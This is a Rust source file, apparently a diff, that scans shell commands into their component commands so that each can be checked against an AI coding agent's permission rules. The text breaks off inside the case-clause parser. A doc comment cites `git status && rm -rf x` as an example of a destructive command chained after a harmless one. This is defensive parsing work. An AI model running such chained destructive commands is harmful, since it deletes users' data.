@@ -1,0 +1,2726 @@
+//! Splits a shell command into the commands it would run, so each one is
+//! checked against the permission rules on its own: `git status && rm -rf x`
+//! asks about `rm -rf x` too, and so do commands inside `$(...)`, backticks,
+//! `<(...)`, pipelines, subshells, groups, loops, conditionals, `case` arms,
+//! function bodies and unquoted heredocs. `cd` targets are collected so
+//! directories outside the project need `external_directory` approval.
+//!
+//! Ported from OpenCode's `ShellScan` (packages/core/src/shell/scan.ts) and
+//! `ShellParse` (shell/parse.ts), MIT. CodeSmith runs commands with
+//! `<shell> -c`, so only the POSIX/Bash/Zsh grammar is ported, not
+//! PowerShell. Like OpenCode, input that cannot be analyzed (malformed
+//! syntax, or a construct this scanner does not know) is reported as
+//! opaque and the command is refused rather than run unchecked.
+//!
+//! Known gaps against OpenCode's scanner (these become opaque, so they are
+//! refused rather than let through): zsh-only short loop forms such as
+//! `for x (a b) cmd`, `time`/`coproc` before a compound command, and C-style
+//! `for ((...))` headers containing substitutions. `&>` is accepted in every
+//! dialect (OpenCode treats it as `&` then `>` under plain `sh`).
+
+use std::path::{Path, PathBuf};
+
+const MAX_INPUT: usize = 64 * 1024;
+const MAX_DEPTH: usize = 32;
+const MAX_COMPOUND_DEPTH: usize = 256;
+
+/// One command the shell would run.
+#[derive(Debug, Clone, PartialEq, Default)]
+pub struct Command {
+    /// The command's source text, including assignments and redirects.
+    pub resource: String,
+    /// Its words with quotes and escapes removed (no assignments or redirects).
+    pub words: Vec<String>,
+    /// The same words as written.
+    pub raw_words: Vec<String>,
+    /// A bare `export`/`declare`/`unset`... that only binds variables.
+    pub declaration: bool,
+    /// Words before the first redirect, when a redirect sits between words.
+    pub redirect_word_count: Option<usize>,
+    /// For commands with no words (only redirects and assignments): where the
+    /// first redirect operator ends, in chars from the start of `resource`.
+    pub redirect_prefix_end: Option<usize>,
+}
+
+/// Why a command could not be analyzed.
+pub type Opaque = &'static str;
+
+/// Every command in `input`, outer commands before the ones substituted into them.
+pub fn scan(input: &str) -> Result<Vec<Command>, Opaque> {
+    if input.len() > MAX_INPUT {
+        return Err("invalid-structure");
+    }
+    let chars: Vec<char> = input.chars().collect();
+    let mut s = Scanner::new(&chars, 0);
+    let (_, stop) = s.list()?;
+    match stop {
+        Stop::Eof => {}
+        Stop::RParen | Stop::Stray => return Err("invalid-structure"),
+        Stop::Keyword(_) | Stop::CaseEnd => return Err("compound-command"),
+    }
+    if !s.heredocs.is_empty() {
+        return Err("heredoc");
+    }
+    Ok(s.finish())
+}
+
+// ---------------------------------------------------------------------------
+// Scanner
+// ---------------------------------------------------------------------------
+
+struct Item {
+    cmd: Command,
+    /// Char span in this scanner's source; `None` when `cmd.resource` is final.
+    span: Option<(usize, usize)>,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq)]
+enum Op {
+    And,
+    Or,
+    Pipe,
+    PipeAmp,
+    Semi,
+    Amp,
+    CaseEnd,
+    LParen,
+    RParen,
+}
+
+struct Word {
+    start: usize,
+    end: usize,
+    raw: String,
+    value: String,
+    quoted: bool,
+    assignment: bool,
+    nested: Vec<Item>,
+}
+
+struct Redir {
+    start: usize,
+    end: usize,
+    op_end: usize,
+    heredoc: bool,
+    nested: Vec<Item>,
+}
+
+enum Tok {
+    Word(Word),
+    Redir(Redir),
+    Op(Op, usize),
+    Newline,
+    Eof,
+}
+
+#[derive(Debug, PartialEq)]
+enum Stop {
+    Eof,
+    RParen,
+    CaseEnd,
+    Keyword(String),
+    /// A separator where a command should start.
+    Stray,
+}
+
+struct Heredoc {
+    delimiter: String,
+    strip_tabs: bool,
+    quoted: bool,
+}
+
+struct Scanner<'a> {
+    s: &'a [char],
+    pos: usize,
+    depth: usize,
+    compound: usize,
+    /// Nesting of `${...}` expansions.
+    params: usize,
+    out: Vec<Item>,
+    heredocs: Vec<Heredoc>,
+    /// Indexes into `out` of commands owning a heredoc whose body is still to come.
+    heredoc_owners: Vec<usize>,
+    /// Where the last heredoc body read ends, for its owner pushed afterwards.
+    heredoc_end: Option<usize>,
+    /// Commands substituted into heredoc bodies, kept until their owner is pushed.
+    heredoc_nested: Vec<Item>,
+    peeked: Option<Tok>,
+}
+
+const TERMINATORS: [&str; 7] = ["then", "elif", "else", "fi", "do", "done", "esac"];
+const DECLARATIONS: [&str; 7] = [
+    "declare", "typeset", "export", "readonly", "local", "unset", "unsetenv",
+];
+
+fn is_name_start(c: char) -> bool {
+    c.is_ascii_alphabetic() || c == '_'
+}
+
+fn is_name_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || c == '_'
+}
+
+impl<'a> Scanner<'a> {
+    fn new(s: &'a [char], depth: usize) -> Self {
+        Scanner {
+            s,
+            pos: 0,
+            depth,
+            compound: 0,
+            params: 0,
+            out: Vec::new(),
+            heredocs: Vec::new(),
+            heredoc_owners: Vec::new(),
+            heredoc_end: None,
+            heredoc_nested: Vec::new(),
+            peeked: None,
+        }
+    }
+
+    fn finish(mut self) -> Vec<Command> {
+        let s = self.s;
+        let rest = std::mem::take(&mut self.heredoc_nested);
+        self.out.extend(rest);
+        self.out
+            .into_iter()
+            .map(|mut it| {
+                if let Some((a, b)) = it.span {
+                    it.cmd.resource = s[a..b].iter().collect();
+                }
+                it.cmd
+            })
+            .collect()
+    }
+
+    fn at(&self, i: usize) -> Option<char> {
+        self.s.get(i).copied()
+    }
+
+    fn starts(&self, i: usize, text: &str) -> bool {
+        (i..).zip(text.chars()).all(|(j, c)| self.at(j) == Some(c))
+    }
+
+    fn text(&self, a: usize, b: usize) -> String {
+        self.s[a..b].iter().collect()
+    }
+
+    // ---- lexing ----------------------------------------------------------
+
+    fn skip_blanks(&mut self) {
+        loop {
+            match self.at(self.pos) {
+                Some(' ') | Some('\t') => self.pos += 1,
+                Some('\\') if self.at(self.pos + 1) == Some('\n') => self.pos += 2,
+                _ => return,
+            }
+        }
+    }
+
+    fn peek(&mut self) -> Result<&Tok, Opaque> {
+        if self.peeked.is_none() {
+            let t = self.lex(false)?;
+            self.peeked = Some(t);
+        }
+        Ok(self.peeked.as_ref().unwrap())
+    }
+
+    fn next(&mut self) -> Result<Tok, Opaque> {
+        match self.peeked.take() {
+            Some(t) => Ok(t),
+            None => self.lex(false),
+        }
+    }
+
+    fn lex(&mut self, cond: bool) -> Result<Tok, Opaque> {
+        loop {
+            self.skip_blanks();
+            match self.at(self.pos) {
+                None => return Ok(Tok::Eof),
+                Some('#') => {
+                    while let Some(c) = self.at(self.pos) {
+                        if c == '\n' {
+                            break;
+                        }
+                        self.pos += 1;
+                    }
+                }
+                Some('\n') => {
+                    self.pos += 1;
+                    self.read_heredocs()?;
+                    return Ok(Tok::Newline);
+                }
+                Some(c) if c.is_whitespace() => return Err("invalid-structure"),
+                Some(_) => break,
+            }
+        }
+        let p = self.pos;
+        let c = self.at(p).unwrap();
+        let n = self.at(p + 1);
+        if (c == '<' || c == '>') && n == Some('(') {
+            return Ok(Tok::Word(self.word()?));
+        }
+        if cond {
+            if c == ';' {
+                self.pos += 1;
+                return Ok(Tok::Op(Op::Semi, p));
+            }
+            if "()<>&|".contains(c) {
+                let len = if (c == '&' || c == '|') && n == Some(c) {
+                    2
+                } else {
+                    1
+                };
+                self.pos += len;
+                let raw = self.text(p, p + len);
+                return Ok(Tok::Word(Word {
+                    start: p,
+                    end: p + len,
+                    value: raw.clone(),
+                    raw,
+                    quoted: false,
+                    assignment: false,
+                    nested: Vec::new(),
+                }));
+            }
+            return Ok(Tok::Word(self.word()?));
+        }
+        let ops: [(&str, Op); 13] = [
+            (";;&", Op::CaseEnd),
+            (";;", Op::CaseEnd),
+            (";&", Op::CaseEnd),
+            (";|", Op::CaseEnd),
+            ("&&", Op::And),
+            ("||", Op::Or),
+            ("|&", Op::PipeAmp),
+            ("&!", Op::Amp),
+            ("&|", Op::Amp),
+            ("|", Op::Pipe),
+            (";", Op::Semi),
+            ("(", Op::LParen),
+            (")", Op::RParen),
+        ];
+        if c == '&' && n != Some('>') {
+            for (t, op) in ops {
+                if t.starts_with('&') && self.starts(p, t) {
+                    self.pos += t.len();
+                    return Ok(Tok::Op(op, p));
+                }
+            }
+            self.pos += 1;
+            return Ok(Tok::Op(Op::Amp, p));
+        }
+        if c != '&' {
+            for (t, op) in ops {
+                if self.starts(p, t) {
+                    self.pos += t.chars().count();
+                    return Ok(Tok::Op(op, p));
+                }
+            }
+        }
+        if let Some(op_start) = self.redirect_start(p) {
+            return Ok(Tok::Redir(self.redirect(p, op_start)?));
+        }
+        Ok(Tok::Word(self.word()?))
+    }
+
+    /// Where a redirect operator starts, if one starts at `p` (after an
+    /// optional fd number or `{name}`).
+    fn redirect_start(&self, p: usize) -> Option<usize> {
+        let c = self.at(p)?;
+        if c == '<' || c == '>' || (c == '&' && self.at(p + 1) == Some('>')) {
+            return Some(p);
+        }
+        if c.is_ascii_digit() {
+            let mut i = p;
+            while self.at(i).is_some_and(|c| c.is_ascii_digit()) {
+                i += 1;
+            }
+            if matches!(self.at(i), Some('<') | Some('>')) && self.at(i + 1) != Some('(') {
+                return Some(i);
+            }
+        }
+        if c == '{' && self.at(p + 1).is_some_and(is_name_start) {
+            let mut i = p + 1;
+            while self.at(i).is_some_and(is_name_char) {
+                i += 1;
+            }
+            if self.at(i) == Some('}') && matches!(self.at(i + 1), Some('<') | Some('>')) {
+                return Some(i + 1);
+            }
+        }
+        None
+    }
+
+    fn redirect(&mut self, start: usize, op_start: usize) -> Result<Redir, Opaque> {
+        const OPS: [&str; 12] = [
+            "&>>", "&>", "<<<", "<<-", "<<", "<>", "<&", ">&", ">|", ">>", ">", "<",
+        ];
+        let op = OPS
+            .iter()
+            .find(|o| self.starts(op_start, o))
+            .copied()
+            .ok_or("invalid-redirect")?;
+        let op_end = op_start + op.len();
+        self.pos = op_end;
+        self.skip_blanks();
+        match self.at(self.pos) {
+            None | Some('\n') | Some(';') | Some('|') | Some(')') => {
+                return Err("invalid-redirect")
+            }
+            Some('&') if !(op == ">&" || op == "<&") => return Err("invalid-redirect"),
+            Some('<') | Some('>') if self.at(self.pos + 1) != Some('(') => {
+                return Err("invalid-redirect")
+            }
+            Some('(') => return Err("invalid-redirect"),
+            _ => {}
+        }
+        let target = self.word()?;
+        let heredoc = op == "<<" || op == "<<-";
+        if heredoc {
+            self.heredocs.push(Heredoc {
+                delimiter: target.value.clone(),
+                strip_tabs: op == "<<-",
+                quoted: target.quoted,
+            });
+        }
+        Ok(Redir {
+            start,
+            end: target.end,
+            op_end,
+            heredoc,
+            nested: target.nested,
+        })
+    }
+
+    /// Read the bodies of pending heredocs, starting at the line after the one
+    /// that introduced them. Returns where the last body ends.
+    fn read_heredocs(&mut self) -> Result<(), Opaque> {
+        if self.heredocs.is_empty() {
+            return Ok(());
+        }
+        let docs = std::mem::take(&mut self.heredocs);
+        let mut end = self.pos;
+        for doc in docs {
+            let mut found = false;
+            while self.pos < self.s.len() {
+                let line_start = self.pos;
+                let mut line_end = line_start;
+                while self.at(line_end).is_some_and(|c| c != '\n') {
+                    line_end += 1;
+                }
+                let mut line = self.text(line_start, line_end);
+                if doc.strip_tabs {
+                    line = line.trim_start_matches('\t').to_string();
+                }
+                if line == doc.delimiter {
+                    found = true;
+                    end = line_end;
+                    self.pos = (line_end + 1).min(self.s.len());
+                    break;
+                }
+                if !doc.quoted {
+                    let nested = self.body_expansions(line_start, line_end)?;
+                    self.heredoc_nested.extend(nested);
+                }
+                self.pos = (line_end + 1).min(self.s.len());
+            }
+            if !found {
+                return Err("heredoc");
+            }
+        }
+        let owners = std::mem::take(&mut self.heredoc_owners);
+        if owners.is_empty() {
+            self.heredoc_end = Some(end);
+        } else {
+            for i in owners {
+                if let Some((_, b)) = self.out[i].span.as_mut() {
+                    *b = end;
+                }
+            }
+            let nested = std::mem::take(&mut self.heredoc_nested);
+            self.out.extend(nested);
+        }
+        Ok(())
+    }
+
+    /// Commands substituted into an unquoted heredoc line.
+    fn body_expansions(&mut self, a: usize, b: usize) -> Result<Vec<Item>, Opaque> {
+        let mut nested = Vec::new();
+        let mut i = a;
+        while i < b {
+            match self.at(i) {
+                Some('\\') => i += 2,
+                Some('$') | Some('`') => {
+                    let mut raw = String::new();
+                    let mut value = String::new();
+                    self.pos = i;
+                    self.expansion(&mut raw, &mut value, &mut nested)?;
+                    if self.pos > b {
+                        return Err("heredoc");
+                    }
+                    i = self.pos.max(i + 1);
+                }
+                _ => i += 1,
+            }
+        }
+        Ok(nested)
+    }
+
+    /// A word starting at `self.pos`.
+    fn word(&mut self) -> Result<Word, Opaque> {
+        let start = self.pos;
+        let mut raw = String::new();
+        let mut value = String::new();
+        let mut quoted = false;
+        let mut assignment = false;
+        let mut nested = Vec::new();
+        let mut name_ok = true;
+        if let (Some(c), Some('(')) = (self.at(start), self.at(start + 1)) {
+            if c == '<' || c == '>' {
+                self.pos += 2;
+                raw.push(c);
+                raw.push('(');
+                self.substitution(&mut nested)?;
+                raw.push_str(&self.text(start + 2, self.pos));
+                value = raw.clone();
+                return Ok(Word {
+                    start,
+                    end: self.pos,
+                    raw,
+                    value,
+                    quoted: false,
+                    assignment: false,
+                    nested,
+                });
+            }
+        }
+        while let Some(c) = self.at(self.pos) {
+            match c {
+                ' ' | '\t' | '\n' | ';' | '&' | '|' | '(' | ')' | '<' | '>' => {
+                    if c == '(' && assignment && raw.ends_with('=') {
+                        // Array assignment: `x=(a b)`.
+                        let end = self.balanced(self.pos)?;
+                        let t = self.text(self.pos, end);
+                        raw.push_str(&t);
+                        value.push_str(&t);
+                        self.pos = end;
+                        continue;
+                    }
+                    break;
+                }
+                '\\' => match self.at(self.pos + 1) {
+                    Some('\n') => {
+                        // A continuation before a word break is not part of the word.
+                        let mut j = self.pos + 2;
+                        while self.at(j) == Some('\\') && self.at(j + 1) == Some('\n') {
+                            j += 2;
+                        }
+                        let after = self.at(j);
+                        if after.is_none_or(|c| " \t\n;&|()<>".contains(c)) {
+                            break;
+                        }
+                        raw.push_str("\\\n");
+                        self.pos += 2;
+                    }
+                    Some(n) => {
+                        raw.push('\\');
+                        raw.push(n);
+                        value.push(n);
+                        quoted = true;
+                        name_ok = false;
+                        self.pos += 2;
+                    }
+                    None => return Err("unterminated-escape"),
+                },
+                '\'' => {
+                    let close = (self.pos + 1..self.s.len())
+                        .find(|&i| self.s[i] == '\'')
+                        .ok_or("unterminated-quote")?;
+                    raw.push_str(&self.text(self.pos, close + 1));
+                    value.push_str(&self.text(self.pos + 1, close));
+                    quoted = true;
+                    name_ok = false;
+                    self.pos = close + 1;
+                }
+                '"' => {
+                    quoted = true;
+                    name_ok = false;
+                    self.double_quoted(&mut raw, &mut value, &mut nested)?;
+                }
+                '$' | '`' => {
+                    name_ok = false;
+                    if c == '$' && self.at(self.pos + 1) == Some('\'') {
+                        quoted = true;
+                    }
+                    self.expansion(&mut raw, &mut value, &mut nested)?;
+                }
+                '=' if name_ok && !assignment && !raw.is_empty() && !quoted => {
+                    let name = raw.trim_end_matches('+');
+                    let base = name.split('[').next().unwrap_or("");
+                    if base.chars().next().is_some_and(is_name_start)
+                        && base.chars().all(is_name_char)
+                        && (base.len() == name.len() || name.ends_with(']'))
+                    {
+                        assignment = true;
+                    }
+                    raw.push('=');
+                    value.push('=');
+                    self.pos += 1;
+                }
+                '[' if name_ok && !assignment => {
+                    // Possible subscript in `a[i]=x`; keep scanning as text.
+                    raw.push('[');
+                    value.push('[');
+                    self.pos += 1;
+                }
+                c => {
+                    if !(is_name_char(c) || c == '+' || c == ']') {
+                        name_ok = false;
+                    }
+                    raw.push(c);
+                    value.push(c);
+                    self.pos += 1;
+                }
+            }
+        }
+        Ok(Word {
+            start,
+            end: self.pos,
+            raw,
+            value,
+            quoted,
+            assignment,
+            nested,
+        })
+    }
+
+    /// End (exclusive) of the parenthesized text starting at `p` (`(`).
+    fn balanced(&self, p: usize) -> Result<usize, Opaque> {
+        let mut depth = 0usize;
+        let mut i = p;
+        while let Some(c) = self.at(i) {
+            match c {
+                '\\' => i += 1,
+                '\'' => {
+                    i = (i + 1..self.s.len())
+                        .find(|&j| self.s[j] == '\'')
+                        .ok_or("unterminated-quote")?;
+                }
+                '(' => depth += 1,
+                ')' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return Ok(i + 1);
+                    }
+                }
+                _ => {}
+            }
+            i += 1;
+        }
+        Err("invalid-structure")
+    }
+
+    fn double_quoted(
+        &mut self,
+        raw: &mut String,
+        value: &mut String,
+        nested: &mut Vec<Item>,
+    ) -> Result<(), Opaque> {
+        raw.push('"');
+        self.pos += 1;
+        loop {
+            match self.at(self.pos) {
+                None => return Err("unterminated-quote"),
+                Some('"') => {
+                    raw.push('"');
+                    self.pos += 1;
+                    return Ok(());
+                }
+                Some('\\') => match self.at(self.pos + 1) {
+                    Some(n) if "$`\"\\\n".contains(n) => {
+                        raw.push('\\');
+                        raw.push(n);
+                        if n != '\n' {
+                            value.push(n);
+                        }
+                        self.pos += 2;
+                    }
+                    Some(_) => {
+                        raw.push('\\');
+                        value.push('\\');
+                        self.pos += 1;
+                    }
+                    None => return Err("unterminated-quote"),
+                },
+                Some('$') | Some('`') => {
+                    if self.at(self.pos) == Some('$') && self.at(self.pos + 1) == Some('\'') {
+                        // `$'` has no special meaning inside double quotes.
+                        raw.push('$');
+                        value.push('$');
+                        self.pos += 1;
+                        continue;
+                    }
+                    self.expansion(raw, value, nested)?;
+                }
+                Some(c) => {
+                    raw.push(c);
+                    value.push(c);
+                    self.pos += 1;
+                }
+            }
+        }
+    }
+
+    /// A `$...` or backtick expansion at `self.pos`.
+    fn expansion(
+        &mut self,
+        raw: &mut String,
+        value: &mut String,
+        nested: &mut Vec<Item>,
+    ) -> Result<(), Opaque> {
+        let start = self.pos;
+        let c = self.at(start).unwrap();
+        if c == '`' {
+            self.backtick(nested)?;
+        } else {
+            match self.at(start + 1) {
+                Some('\'') => {
+                    // ANSI-C quoting.
+                    let mut i = start + 2;
+                    let mut decoded = String::new();
+                    loop {
+                        match self.at(i) {
+                            None => return Err("unterminated-quote"),
+                            Some('\'') => break,
+                            Some('\\') => {
+                                let n = self.at(i + 1).ok_or("unterminated-quote")?;
+                                match n {
+                                    'n' => decoded.push('\n'),
+                                    't' => decoded.push('\t'),
+                                    'r' => decoded.push('\r'),
+                                    'a' => decoded.push('\x07'),
+                                    'b' => decoded.push('\x08'),
+                                    'e' | 'E' => decoded.push('\x1b'),
+                                    'f' => decoded.push('\x0c'),
+                                    'v' => decoded.push('\x0b'),
+                                    '\\' | '\'' | '"' | '?' => decoded.push(n),
+                                    other => {
+                                        decoded.push('\\');
+                                        decoded.push(other);
+                                    }
+                                }
+                                i += 2;
+                            }
+                            Some(ch) => {
+                                decoded.push(ch);
+                                i += 1;
+                            }
+                        }
+                    }
+                    raw.push_str(&self.text(start, i + 1));
+                    value.push_str(&decoded);
+                    self.pos = i + 1;
+                    return Ok(());
+                }
+                Some('"') => {
+                    self.pos += 1;
+                    let mut r = String::from("$");
+                    let mut v = String::new();
+                    self.double_quoted(&mut r, &mut v, nested)?;
+                    raw.push_str(&r);
+                    value.push_str(&v);
+                    return Ok(());
+                }
+                Some('(') if self.at(start + 2) == Some('(') => {
+                    // Arithmetic expansion: bounded by its matching `))`.
+                    let end = self.arithmetic_end(start + 1)?;
+                    self.pos = end;
+                }
+                Some('(') => {
+                    self.pos = start + 2;
+                    self.substitution(nested)?;
+                }
+                Some('{') => {
+                    self.pos = start + 2;
+                    self.params += 1;
+                    let r = self.parameter(nested, self.params);
+                    self.params -= 1;
+                    r?;
+                }
+                Some(n) if is_name_start(n) => {
+                    let mut i = start + 1;
+                    while self.at(i).is_some_and(is_name_char) {
+                        i += 1;
+                    }
+                    self.pos = i;
+                }
+                Some(n) if n.is_ascii_digit() || "@*#?$!-".contains(n) => {
+                    self.pos = start + 2;
+                }
+                _ => {
+                    raw.push('$');
+                    value.push('$');
+                    self.pos = start + 1;
+                    return Ok(());
+                }
+            }
+        }
+        let t = self.text(start, self.pos);
+        raw.push_str(&t);
+        value.push_str(&t);
+        Ok(())
+    }
+
+    /// End of `((...))` starting at `p` (the first `(`).
+    fn arithmetic_end(&self, p: usize) -> Result<usize, Opaque> {
+        let end = self.balanced(p)?;
+        if self.at(end - 2) != Some(')') {
+            return Err("invalid-structure");
+        }
+        Ok(end)
+    }
+
+    /// The body of `$(...)` or `<(...)`, starting after the `(`.
+    fn substitution(&mut self, nested: &mut Vec<Item>) -> Result<(), Opaque> {
+        if self.depth + 1 >= MAX_DEPTH {
+            return Err("command-substitution");
+        }
+        let saved_out = std::mem::take(&mut self.out);
+        let saved_owners = std::mem::take(&mut self.heredoc_owners);
+        let saved_peek = self.peeked.take();
+        self.depth += 1;
+        let result = self.list();
+        self.depth -= 1;
+        let inner = std::mem::replace(&mut self.out, saved_out);
+        self.heredoc_owners = saved_owners;
+        let (_, stop) = result?;
+        if stop != Stop::RParen {
+            return Err("command-substitution");
+        }
+        self.next()?;
+        self.peeked = saved_peek;
+        nested.extend(inner);
+        Ok(())
+    }
+
+    /// The rest of `${...}` after `${` (or a nested `{`).
+    fn parameter(&mut self, nested: &mut Vec<Item>, depth: usize) -> Result<(), Opaque> {
+        if depth > MAX_DEPTH {
+            return Err("invalid-structure");
+        }
+        loop {
+            match self.at(self.pos) {
+                None => return Err("unterminated-quote"),
+                Some('}') => {
+                    self.pos += 1;
+                    return Ok(());
+                }
+                Some('\\') => self.pos += 2,
+                Some('\'') => {
+                    let close = (self.pos + 1..self.s.len())
+                        .find(|&i| self.s[i] == '\'')
+                        .ok_or("unterminated-quote")?;
+                    self.pos = close + 1;
+                }
+                Some('"') => {
+                    let (mut r, mut v) = (String::new(), String::new());
+                    self.double_quoted(&mut r, &mut v, nested)?;
+                }
+                Some('$') | Some('`') => {
+                    let (mut r, mut v) = (String::new(), String::new());
+                    self.expansion(&mut r, &mut v, nested)?;
+                }
+                Some('{') => {
+                    self.pos += 1;
+                    self.parameter(nested, depth + 1)?;
+                }
+                Some(_) => self.pos += 1,
+            }
+        }
+    }
+
+    fn backtick(&mut self, nested: &mut Vec<Item>) -> Result<(), Opaque> {
+        let mut inner = Vec::new();
+        let mut i = self.pos + 1;
+        loop {
+            match self.at(i) {
+                None => return Err("command-substitution"),
+                Some('`') => break,
+                Some('\\') => {
+                    let n = self.at(i + 1).ok_or("command-substitution")?;
+                    if "$`\\".contains(n) {
+                        inner.push(n);
+                    } else {
+                        inner.push('\\');
+                        inner.push(n);
+                    }
+                    i += 2;
+                }
+                Some(c) => {
+                    inner.push(c);
+                    i += 1;
+                }
+            }
+        }
+        self.pos = i + 1;
+        if self.depth + 1 >= MAX_DEPTH {
+            return Err("command-substitution");
+        }
+        let mut sub = Scanner::new(&inner, self.depth + 1);
+        let (_, stop) = sub.list().map_err(|_| "command-substitution")?;
+        if stop != Stop::Eof || !sub.heredocs.is_empty() {
+            return Err("command-substitution");
+        }
+        nested.extend(sub.finish().into_iter().map(|cmd| Item { cmd, span: None }));
+        Ok(())
+    }
+
+    // ---- grammar ---------------------------------------------------------
+
+    fn skip_newlines(&mut self) -> Result<(), Opaque> {
+        while matches!(self.peek()?, Tok::Newline) {
+            self.next()?;
+        }
+        Ok(())
+    }
+
+    fn peek_keyword(&mut self) -> Result<Option<String>, Opaque> {
+        Ok(match self.peek()? {
+            Tok::Word(w) if !w.quoted => Some(w.value.clone()),
+            _ => None,
+        })
+    }
+
+    /// Statements until EOF, `)`, a case terminator, a closing keyword or a
+    /// stray separator (none of which is consumed).
+    fn list(&mut self) -> Result<(usize, Stop), Opaque> {
+        let mut count = 0;
+        loop {
+            self.skip_newlines()?;
+            let stop = match self.peek()? {
+                Tok::Eof => Some(Stop::Eof),
+                Tok::Op(Op::RParen, _) => Some(Stop::RParen),
+                Tok::Op(Op::CaseEnd, _) => Some(Stop::CaseEnd),
+                Tok::Op(Op::LParen, _) => None,
+                Tok::Op(_, _) => Some(Stop::Stray),
+                Tok::Word(w)
+                    if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") =>
+                {
+                    Some(Stop::Keyword(w.value.clone()))
+                }
+                _ => None,
+            };
+            if let Some(stop) = stop {
+                return Ok((count, stop));
+            }
+            self.and_or()?;
+            count += 1;
+            match self.peek()? {
+                Tok::Op(Op::Semi, _) | Tok::Op(Op::Amp, _) => {
+                    self.next()?;
+                }
+                Tok::Newline | Tok::Eof | Tok::Op(Op::RParen, _) | Tok::Op(Op::CaseEnd, _) => {}
+                Tok::Word(w)
+                    if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") => {
+                }
+                _ => return Err("invalid-structure"),
+            }
+        }
+    }
+
+    fn and_or(&mut self) -> Result<(), Opaque> {
+        self.pipeline()?;
+        while matches!(self.peek()?, Tok::Op(Op::And, _) | Tok::Op(Op::Or, _)) {
+            self.next()?;
+            self.skip_newlines()?;
+            self.pipeline()?;
+        }
+        Ok(())
+    }
+
+    fn pipeline(&mut self) -> Result<(), Opaque> {
+        while self.peek_keyword()?.as_deref() == Some("!") {
+            self.next()?;
+        }
+        self.command()?;
+        while matches!(self.peek()?, Tok::Op(Op::Pipe, _) | Tok::Op(Op::PipeAmp, _)) {
+            self.next()?;
+            self.skip_newlines()?;
+            self.command()?;
+        }
+        Ok(())
+    }
+
+    fn require_command_start(&mut self) -> Result<(), Opaque> {
+        match self.peek()? {
+            Tok::Word(w)
+                if !w.quoted && (TERMINATORS.contains(&w.value.as_str()) || w.value == "}") =>
+            {
+                Err("invalid-structure")
+            }
+            Tok::Word(_) | Tok::Redir(_) | Tok::Op(Op::LParen, _) => Ok(()),
+            _ => Err("invalid-structure"),
+        }
+    }
+
+    fn command(&mut self) -> Result<(), Opaque> {
+        self.require_command_start()?;
+        if self.compound > MAX_COMPOUND_DEPTH {
+            return Err("compound-command");
+        }
+        if let Tok::Op(Op::LParen, p) = *self.peek()? {
+            self.next()?;
+            if self.at(p + 1) == Some('(') && self.pos == p + 1 {
+                return self.arithmetic_command(p);
+            }
+            self.compound += 1;
+            let (n, stop) = self.list()?;
+            self.compound -= 1;
+            if stop != Stop::RParen || n == 0 {
+                return Err("invalid-structure");
+            }
+            self.next()?;
+            return self.trailing_redirects();
+        }
+        let keyword = self.peek_keyword()?;
+        match keyword.as_deref() {
+            Some("{") => {
+                self.next()?;
+                self.block("}")?;
+                self.trailing_redirects()
+            }
+            Some("if") => {
+                self.next()?;
+                self.if_clause()?;
+                self.trailing_redirects()
+            }
+            Some("while") | Some("until") => {
+                self.next()?;
+                self.block("do")?;
+                self.block("done")?;
+                self.trailing_redirects()
+            }
+            Some("for") | Some("select") => {
+                self.next()?;
+                self.for_clause()?;
+                self.trailing_redirects()
+            }
+            Some("case") => {
+                self.next()?;
+                self.case_clause()?;
+                self.trailing_redirects()
+            }
+            Some("[[") => {
+                self.next()?;
+                self.conditional()?;
+                self.trailing_redirects()
+            }
+            Some("function") => {
+                self.next()?;
+                match self.next()? {
+                    Tok::Word(_) => {}
+                    _ => return Err("compound-command"),
+                }
+                self.skip_blanks();
+                if self.at(self.pos) == Some('(') {
+                    self.pos += 1;
+                    self.skip_blanks();
+                    if self.at(self.pos) != Some(')') {
+                        return Err("compound-command");
+                    }
+                    self.pos += 1;
+                }
+                self.function_body()
+            }
+            _ => self.simple_command(),
+        }
+    }
+
+    /// A list ending in `end`, with at least one statement.
+    fn block(&mut self, end: &str) -> Result<(), Opaque> {
+        self.compound += 1;
+        let (n, stop) = self.list()?;
+        self.compound -= 1;
+        if n == 0 || stop != Stop::Keyword(end.into()) {
+            return Err("compound-command");
+        }
+        self.next()?;
+        Ok(())
+    }
+
+    fn if_clause(&mut self) -> Result<(), Opaque> {
+        self.block("then")?;
+        loop {
+            self.compound += 1;
+            let (n, stop) = self.list()?;
+            self.compound -= 1;
+            if n == 0 {
+                return Err("compound-command");
+            }
+            match stop {
+                Stop::Keyword(k) if k == "elif" => {
+                    self.next()?;
+                    self.block("then")?;
+                }
+                Stop::Keyword(k) if k == "else" => {
+                    self.next()?;
+                    return self.block("fi");
+                }
+                Stop::Keyword(k) if k == "fi" => {
+                    self.next()?;
+                    return Ok(());
+                }
+                _ => return Err("compound-command"),
+            }
+        }
+    }
+
+    fn for_clause(&mut self) -> Result<(), Opaque> {
+        if let Tok::Op(Op::LParen, p) = *self.peek()? {
+            if self.at(p + 1) != Some('(') {
+                return Err("compound-command");
+            }
+            self.peeked = None;
+            self.pos = self.arithmetic_end(p)?;
+        } else {
+            match self.next()? {
+                Tok::Word(w) if !w.quoted && w.raw.chars().all(is_name_char) => {}
+                _ => return Err("compound-command"),
+            }
+            self.skip_newlines()?;
+            if self.peek_keyword()?.as_deref() == Some("in") {
+                self.next()?;
+                loop {
+                    match self.next()? {
+                        Tok::Word(w) => self.out.extend(w.nested),
+                        Tok::Op(Op::Semi, _) | Tok::Newline => break,
+                        _ => return Err("compound-command"),
+                    }
+                }
+            }
+        }
+        if let Tok::Op(Op::Semi, _) = self.peek()? {
+            self.next()?;
+        }
+        self.skip_newlines()?;
+        match self.peek_keyword()?.as_deref() {
+            Some("do") => {
+                self.next()?;
+                self.block("done")
+            }
+            Some("{") => {
+                self.next()?;
+                self.block("}")
+            }
+            _ => Err("compound-command"),
+        }
+    }
+
+    fn case_clause(&mut self) -> Result<(), Opaque> {
+        match self.next()? {
+            Tok::Word(w) => self.out.extend(w.nested),
+            _ => return Err("compound-command"),
+        }
+        self.skip_newlines()?;
+        if self.peek_keyword()?.as_deref() != Some("in") {
+            return Err("compound-command");
+        }
+        self.next()?;
+        loop {
+            self.skip_newlines()?;
+            if self.peek_keyword()?.as_deref() == Some("esac") {
+                self.next()?;
+                return Ok(());
+            }
+            if let Tok::Op(Op::LParen, _) = self.peek()? {
+                self.next()?;
+            }
